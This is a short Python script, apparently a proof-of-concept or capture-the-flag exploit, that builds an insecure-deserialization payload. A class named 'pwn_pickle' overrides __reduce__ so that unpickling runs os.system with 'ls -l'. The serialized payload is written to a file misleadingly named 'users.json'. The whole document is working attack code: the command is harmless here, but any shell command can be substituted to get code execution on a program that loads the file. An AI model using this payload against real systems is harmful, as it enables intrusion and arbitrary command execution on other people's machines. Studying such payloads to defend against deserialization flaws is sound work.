import pickle
import os

class pwn_pickle(object):
	def __reduce__(self):
		return (os.system, ("ls -l",))

pickle_pwn_data = pickle.dumps(pwn_pickle())
with open("users.json", "wb") as f:
	f.write(pickle_pwn_data)



